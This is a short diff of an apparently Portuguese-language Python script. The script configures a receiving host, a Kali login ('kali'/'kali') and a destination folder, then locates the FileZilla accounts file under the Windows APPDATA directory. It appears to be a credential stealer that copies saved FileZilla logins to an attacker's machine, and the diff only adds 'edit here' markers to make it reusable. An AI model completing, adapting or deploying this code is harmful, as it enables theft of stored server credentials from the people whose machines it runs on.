@@ -7,10 +7,10 @@ import pathlib
 # Exibe mensagem de conexao com o host
 print('Tentando conexao com o host...')
 
-host = '192.168.15.9'
-user = 'kali'
-passwd = 'kali'
-path = '/home/kali/' # Trocar a pasta receptora aqui
+host = '192.168.15.9' ###### EDITAR AQUI
+user = 'kali' ###### EDITAR AQUI
+passwd = 'kali' ###### EDITAR AQUI
+path = '/home/kali/' #### Trocar a pasta receptora aqui
 
 # Arquivo de contas do Filezilla aqui #### NÃO MEXER
 appdata = pathlib.Path(os.getenv('APPDATA'))
